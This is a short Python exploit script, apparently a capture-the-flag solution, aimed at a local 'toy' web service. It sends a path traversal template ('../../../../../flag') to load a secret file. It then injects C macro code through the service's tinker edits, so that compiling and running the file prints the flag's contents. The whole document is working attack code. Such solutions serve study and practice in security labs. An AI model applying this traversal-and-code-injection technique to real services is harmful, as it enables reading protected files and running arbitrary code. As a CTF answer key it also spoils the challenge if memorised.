#!/usr/bin/python3

import requests

_URL = "http://localhost"

_PAYLOAD_PREFIX=r"""
#include <stdio.h>
#define XSTR(X) #X
#define STR(X) XSTR(X)
#define FLAG """

_PAYLOAD_SUFFIX=r"""
int main(void) {
  fprintf(stderr, "%s\n", STR(FLAG));
  return 0;
}
"""

def main():
    create_payload = {
        "template": "../../../../../flag"
    }

    response = requests.post(f"{_URL}/create", json=create_payload)
    assert response.status_code == 200

    toy_id = response.json()["toy_id"]

    tinker_payloads = [{
        "op": "replace",
        "index": 0,
        "length": 0,
        "content": _PAYLOAD_PREFIX
    },
    {
        "op": "replace",
        "index": len(_PAYLOAD_PREFIX) + 100,
        "length": 0,
        "content": _PAYLOAD_SUFFIX
    },
    {
        "op": "render",
    }
    ]

    for tinker_payload in tinker_payloads:
        response = requests.post(f"{_URL}/tinker/{toy_id}", json=tinker_payload)
        assert response.status_code == 200, f"tinkering failed {response.status_code}"
        assert response.json()["status"] == "tinkered"

    response = requests.post(f"{_URL}/assemble/{toy_id}", json={})
    assert response.status_code == 200, f"assembling failed {response.status_code}"
    assert response.json()["status"] == "assembled"

    response = requests.post(f"{_URL}/play/{toy_id}", json={})
    assert response.status_code == 200
    response_json = response.json()

    print(response_json["stdout"])
    print(response_json["stderr"])
    print(response_json["returncode"])
    

if __name__ == "__main__":
    main()
